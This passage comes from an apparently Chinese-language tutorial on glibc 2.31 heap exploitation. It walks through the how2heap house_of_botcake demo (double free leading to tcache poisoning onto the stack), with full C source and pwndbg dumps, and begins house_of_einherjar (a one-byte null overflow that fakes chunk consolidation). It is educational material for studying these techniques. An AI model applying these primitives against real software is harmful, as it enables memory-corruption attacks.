class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559a50</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559a60</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559a70</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559a80</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559a90</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559aa0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559ab0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559ac0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559ad0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559ae0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559af0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559b00</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559b10</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000111</span>        ====== &gt; chunk a</span><br><span class="line"><span class="number">0x555555559b20</span>:<span class="number">0x00007ffff7fb0be0</span><span class="number">0x00007ffff7fb0be0</span></span><br><span class="line"><span class="number">0x555555559b30</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure><p>然后我们要想办法把 chunk a 放入 tcache  bin里，由于此时 tcache bins 是满的，所以我们先取一个出来, 然后再 free 一次 a</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">In file: /media/psf/Home/Downloads/how2heap/glibc_2<span class="number">.31</span>/house_of_botcake.c</span><br><span class="line">   <span class="number">53</span></span><br><span class="line">   <span class="number">54</span>     <span class="built_in">puts</span>(<span class="string">&quot;Step 3: free the previous chunk and make it consolidate with the victim chunk.&quot;</span>);</span><br><span class="line">   <span class="number">55</span>     <span class="built_in">free</span>(prev);</span><br><span class="line">   <span class="number">56</span></span><br><span class="line">   <span class="number">57</span>     <span class="built_in">puts</span>(<span class="string">&quot;Step 4: add the victim chunk to tcache list by taking one out from it and free victim again\n&quot;</span>);</span><br><span class="line"> ► <span class="number">58</span>     <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">   <span class="number">59</span>     <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">   <span class="number">60</span>     <span class="built_in">free</span>(a);<span class="comment">// a is already freed</span></span><br><span class="line">   <span class="number">61</span>     <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">   <span class="number">62</span></span><br><span class="line">   <span class="number">63</span>     <span class="comment">// simple tcache poisoning</span></span><br></pre></td></tr></table></figure><p>此时 a chunk 就会被放入 tcahcebins 里，同时 prev 可以控制  chunk a 的内容</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x110</span> [  <span class="number">7</span>]: <span class="number">0x555555559b20</span> —▸ <span class="number">0x5555555597f0</span> —▸ <span class="number">0x5555555596e0</span> —▸ <span class="number">0x5555555595d0</span> —▸ <span class="number">0x5555555594c0</span> —▸ <span class="number">0x5555555593b0</span> —▸ <span class="number">0x5555555592a0</span> ◂— <span class="number">0x0</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x555555559a00</span> —▸ <span class="number">0x7ffff7fb0be0</span> (main_arena+<span class="number">96</span>) ◂— <span class="number">0x555555559a00</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt; p a</span><br><span class="line">$<span class="number">1</span> = (<span class="keyword">intptr_t</span> *) <span class="number">0x555555559b20</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>所以我们从此时的 unsortedbin 给他分一块出来，然后修改其 fd 的值</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">64</span>     <span class="built_in">puts</span>(<span class="string">&quot;Launch tcache poisoning&quot;</span>);</span><br><span class="line">  <span class="number">65</span>     <span class="built_in">puts</span>(<span class="string">&quot;Now the victim is contained in a larger freed chunk, we can do a simple tcache poisoning by using overlapped chunk&quot;</span>);</span><br><span class="line">  <span class="number">66</span>     <span class="keyword">intptr_t</span> *b = <span class="built_in">malloc</span>(<span class="number">0x120</span>);</span><br><span class="line">► <span class="number">67</span>     <span class="built_in">puts</span>(<span class="string">&quot;We simply overwrite victim&#x27;s fwd pointer&quot;</span>);</span><br><span class="line">  <span class="number">68</span>     b[<span class="number">0x120</span>/<span class="number">8</span><span class="number">-2</span>] = (<span class="keyword">long</span>)stack_var;</span><br><span class="line">  <span class="number">69</span></span><br></pre></td></tr></table></figure><p>那么此时我们就成功污染了 tachebin 的内容 </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x110</span> [  <span class="number">7</span>]: <span class="number">0x555555559b20</span> —▸ <span class="number">0x7fffffffe260</span> —▸ <span class="number">0x555555554040</span> ◂— <span class="number">0x400000006</span></span><br><span class="line">fastbins</span><br><span class="line"><span class="number">0x20</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x30</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x555555559b30</span> —▸ <span class="number">0x7ffff7fb0be0</span> (main_arena+<span class="number">96</span>) ◂— <span class="number">0x555555559b30</span></span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>我们接着只需要两次 malloc 就能拿到 0x7fffffffe260 这个地址</p><p>完整代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * This attack should bypass the restriction introduced in</span></span><br><span class="line"><span class="comment">     * https://sourceware.org/git/?p=glibc.git;a=commit;h=bcdaad21d4635931d1bd3b54a7894276925d081d</span></span><br><span class="line"><span class="comment">     * If the libc does not include the restriction, you can simply double free the victim and do a</span></span><br><span class="line"><span class="comment">     * simple tcache poisoning</span></span><br><span class="line"><span class="comment">     * And thanks to @anton00b and @subwire for the weird name of this technique */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// disable buffering so _IO_FILE does not interfere with our heap</span></span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// introduction</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;This file demonstrates a powerful tcache poisoning attack by tricking malloc into&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;returning a pointer to an arbitrary location (in this demo, the stack).&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;This attack only relies on double free.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// prepare the target</span></span><br><span class="line">    <span class="keyword">intptr_t</span> stack_var[<span class="number">4</span>];</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;The address we want malloc() to return, namely,&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;the target address is %p.\n\n&quot;</span>, stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// prepare heap layout</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Preparing heap layout&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Allocating 7 chunks(malloc(0x100)) for us to fill up tcache list later.&quot;</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *x[<span class="number">7</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="keyword">sizeof</span>(x)/<span class="keyword">sizeof</span>(<span class="keyword">intptr_t</span>*); i++)&#123;</span><br><span class="line">        x[i] = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Allocating a chunk for later consolidation&quot;</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *prev = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Allocating the victim chunk.&quot;</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;malloc(0x100): a=%p.\n&quot;</span>, a); </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Allocating a padding to prevent consolidation.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x10</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// cause chunk overlapping</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Now we are able to cause chunk overlapping&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Step 1: fill up tcache list&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++)&#123;</span><br><span class="line">        <span class="built_in">free</span>(x[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Step 2: free the victim chunk so it will be added to unsorted bin&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(a);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Step 3: free the previous chunk and make it consolidate with the victim chunk.&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(prev);</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Step 4: add the victim chunk to tcache list by taking one out from it and free victim again\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">    <span class="built_in">free</span>(a);<span class="comment">// a is already freed</span></span><br><span class="line">    <span class="comment">/*VULNERABILITY*/</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// simple tcache poisoning</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Launch tcache poisoning&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Now the victim is contained in a larger freed chunk, we can do a simple tcache poisoning by using overlapped chunk&quot;</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *b = <span class="built_in">malloc</span>(<span class="number">0x120</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;We simply overwrite victim&#x27;s fwd pointer&quot;</span>);</span><br><span class="line">    b[<span class="number">0x120</span>/<span class="number">8</span><span class="number">-2</span>] = (<span class="keyword">long</span>)stack_var;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// take target out</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Now we can cash out the target chunk.&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *c = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;The new chunk is at %p\n&quot;</span>, c);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// sanity check</span></span><br><span class="line">    assert(c==stack_var);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Got control on target/stack!\n\n&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// note</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Note:&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;And the wonderful thing about this exploitation is that: you can free b, victim again and modify the fwd pointer of victim&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;In that case, once you have done this exploitation, you can have many arbitary writes very easily.&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-house-of-einherjar"><a href="#4-house-of-einherjar" class="headerlink" title="4. house_of_einherjar"></a>4. house_of_einherjar</h3><p>这里展示的是通过一字节溢出，取到任意地址的技术</p><p>首先，在堆上伪造一个 chunk </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">─────────────────────────────────────────────────[ SOURCE (CODE) ]──────────────────────────────────────────────────</span><br><span class="line">In file: /media/psf/Home/Downloads/how2heap/glibc_2<span class="number">.31</span>/house_of_einherjar.c</span><br><span class="line">   <span class="number">35</span>     <span class="built_in">printf</span>(<span class="string">&quot;\nWe allocate 0x38 bytes for &#x27;a&#x27; and use it to create a fake chunk\n&quot;</span>);</span><br><span class="line">   <span class="number">36</span>     <span class="keyword">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">0x38</span>);</span><br><span class="line">   <span class="number">37</span></span><br><span class="line">   <span class="number">38</span>     <span class="comment">// create a fake chunk</span></span><br><span class="line">   <span class="number">39</span>     <span class="built_in">printf</span>(<span class="string">&quot;\nWe create a fake chunk preferably before the chunk(s) we want to overlap, and we must know its address.\n&quot;</span>);</span><br><span class="line"> ► <span class="number">40</span>     <span class="built_in">printf</span>(<span class="string">&quot;We set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks\n&quot;</span>);</span><br><span class="line">   <span class="number">41</span></span><br><span class="line">   <span class="number">42</span>     a[<span class="number">0</span>] = <span class="number">0</span>;    <span class="comment">// prev_size (Not Used)</span></span><br><span class="line">   <span class="number">43</span>     a[<span class="number">1</span>] = <span class="number">0x60</span>; <span class="comment">// size</span></span><br><span class="line">   <span class="number">44</span>     a[<span class="number">2</span>] = (<span class="keyword">size_t</span>) a; <span class="comment">// fwd</span></span><br><span class="line">   <span class="number">45</span>     a[<span class="number">3</span>] = (<span class="keyword">size_t</span>) a; <span class="comment">// bck</span></span><br></pre></td></tr></table></figure><p>该 fake chunk结构如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; malloc_chunk -f &amp;a[<span class="number">0</span>]</span><br><span class="line">Fake chunk | Allocated chunk</span><br><span class="line">Addr: <span class="number">0x5555555592a0</span></span><br><span class="line">prev_size: <span class="number">0x00</span></span><br><span class="line">size: <span class="number">0x60</span></span><br><span class="line">fd: <span class="number">0x5555555592a0</span></span><br><span class="line">bk: <span class="number">0x5555555592a0</span></span><br><span class="line">fd_nextsize: <span class="number">0x00</span></span><br><span class="line">bk_nextsize: <span class="number">0x00</span></span><br></pre></td></tr></table></figure><p>然后我们在堆上布局两个 chunk 分别为 b 和 c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; parseheap</span><br><span class="line">addr                prev                size                 status              fd                bk</span><br><span class="line"><span class="number">0x555555559000</span>      <span class="number">0x0</span>                 <span class="number">0x290</span>                Used                None              None</span><br><span class="line"><span class="number">0x555555559290</span>      <span class="number">0x0</span>                 <span class="number">0x40</span>                 Used                None              None</span><br><span class="line"><span class="number">0x5555555592d0</span>      <span class="number">0x0</span>                 <span class="number">0x30</span>                 Used                None              None</span><br><span class="line"><span class="number">0x555555559300</span>      <span class="number">0x0</span>                 <span class="number">0x100</span>                Used                None              None</span><br><span class="line">pwndbg&gt; p b</span><br><span class="line">$<span class="number">11</span> = (<span class="keyword">uint8_t</span> *) <span class="number">0x5555555592e0</span> <span class="string">&quot;&quot;</span></span><br><span class="line">pwndbg&gt; p c</span><br><span class="line">$<span class="number">12</span> = (<span class="keyword">uint8_t</span> *) <span class="number">0x555555559310</span> <span class="string">&quot;&quot;</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>然后此时假设我们有一个 一字节溢出,k可以覆盖到, c chunk 的size 位置，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">In file: /media/psf/Home/Downloads/how2heap/glibc_2<span class="number">.31</span>/house_of_einherjar.c</span><br><span class="line">   <span class="number">71</span>     <span class="comment">// This technique works by overwriting the size metadata of an allocated chunk as well as the prev_inuse bit</span></span><br><span class="line">   <span class="number">72</span></span><br><span class="line">   <span class="number">73</span>     <span class="built_in">printf</span>(<span class="string">&quot;\nc.size: %#lx\n&quot;</span>, *c_size_ptr);</span><br><span class="line">   <span class="number">74</span>     <span class="built_in">printf</span>(<span class="string">&quot;c.size is: (0x100) | prev_inuse = 0x101\n&quot;</span>);</span><br><span class="line">   <span class="number">75</span></span><br><span class="line"> ► <span class="number">76</span>     <span class="built_in">printf</span>(<span class="string">&quot;We overflow &#x27;b&#x27; with a single null byte into the metadata of &#x27;c&#x27;\n&quot;</span>);</span><br><span class="line">   <span class="number">77</span>     b[real_b_size] = <span class="number">0</span>;</span><br><span class="line">   <span class="number">78</span>     <span class="built_in">printf</span>(<span class="string">&quot;c.size: %#lx\n&quot;</span>, *c_size_ptr);</span><br><span class="line">   <span class="number">79</span></span><br><span class="line">   <span class="number">80</span>     <span class="built_in">printf</span>(<span class="string">&quot;It is easier if b.size is a multiple of 0x100 so you &quot;</span></span><br><span class="line">   <span class="number">81</span>            <span class="string">&quot;don&#x27;t change the size of b, only its prev_inuse bit\n&quot;</span>);</span><br><span class="line">─────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; x/<span class="number">20</span>gx b<span class="number">-0x10</span></span><br><span class="line"><span class="number">0x5555555592d0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5555555592e0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555555592f0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559300</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000101</span></span><br><span class="line"><span class="number">0x555555559310</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559320</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559330</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559340</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559350</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559360</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line">pwndbg&gt; chunkinfo c<span class="number">-0x10</span></span><br><span class="line">==================================</span><br><span class="line">            Chunk info</span><br><span class="line">==================================</span><br><span class="line">Status :  Used</span><br><span class="line">Can<span class="number">&#x27;</span>t access memory</span><br><span class="line">prev_size : <span class="number">0x0</span></span><br><span class="line">size : <span class="number">0x100</span></span><br><span class="line">prev_inused : <span class="number">1</span></span><br><span class="line">is_mmap : <span class="number">0</span></span><br><span class="line">non_mainarea : <span class="number">0</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>那么当执行完之后， c chunk 的 prev_inused 位将被置零</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; chunkinfo c<span class="number">-0x10</span></span><br><span class="line">==================================</span><br><span class="line">            Chunk info</span><br><span class="line">==================================</span><br><span class="line">Status :  Used</span><br><span class="line">Can<span class="number">&#x27;</span>t access memory</span><br><span class="line">prev_size : <span class="number">0x0</span></span><br><span class="line">size : <span class="number">0x100</span></span><br><span class="line">prev_inused : <span class="number">0</span></span><br><span class="line">is_mmap : <span class="number">0</span></span><br><span class="line">non_mainarea : <span class="number">0</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>这样会导致 chunk a 被认为是 free 的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; parseheap</span><br><span class="line">addr                prev                size                 status              fd                bk</span><br><span class="line"><span class="number">0x555555559000</span>      <span class="number">0x0</span>                 <span class="number">0x290</span>                Used                None              None</span><br><span class="line"><span class="number">0x555555559290</span>      <span class="number">0x0</span>                 <span class="number">0x40</span>                 Used                None              None</span><br><span class="line"><span class="number">0x5555555592d0</span>      <span class="number">0x0</span>                 <span class="number">0x30</span>                 Freed                <span class="number">0x0</span>               <span class="number">0x0</span></span><br><span class="line"><span class="number">0x555555559300</span>      <span class="number">0x0</span>                 <span class="number">0x100</span>                Used                None              None</span><br></pre></td></tr></table></figure><p>由于我们在  chunk a 的位置放了一个 fake chunk，我们此时修改了 chunk c的size 位置，同时我们需要其 prev_size 合法，所以也要修改 </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">83</span>     <span class="comment">// Write a fake prev_size to the end of b</span></span><br><span class="line">  <span class="number">84</span>     <span class="built_in">printf</span>(<span class="string">&quot;\nWe write a fake prev_size to the last %lu bytes of &#x27;b&#x27; so that &quot;</span></span><br><span class="line">  <span class="number">85</span>            <span class="string">&quot;it will consolidate with our fake chunk\n&quot;</span>, <span class="keyword">sizeof</span>(<span class="keyword">size_t</span>));</span><br><span class="line">  <span class="number">86</span>     <span class="keyword">size_t</span> fake_size = (<span class="keyword">size_t</span>)((c - <span class="keyword">sizeof</span>(<span class="keyword">size_t</span>) * <span class="number">2</span>) - (<span class="keyword">uint8_t</span>*) a);</span><br><span class="line">► <span class="number">87</span>     <span class="built_in">printf</span>(<span class="string">&quot;Our fake prev_size will be %p - %p = %#lx\n&quot;</span>, c - <span class="keyword">sizeof</span>(<span class="keyword">size_t</span>) * <span class="number">2</span>, a, fake_size);</span><br><span class="line">  <span class="number">88</span>     *(<span class="keyword">size_t</span>*) &amp;b[real_b_size-<span class="keyword">sizeof</span>(<span class="keyword">size_t</span>)] = fake_size;</span><br></pre></td></tr></table></figure><p>我们将 chunk b的preve size 修改为 0x60</p><p>紧接着，照样填满 tcache,  然后我们去free 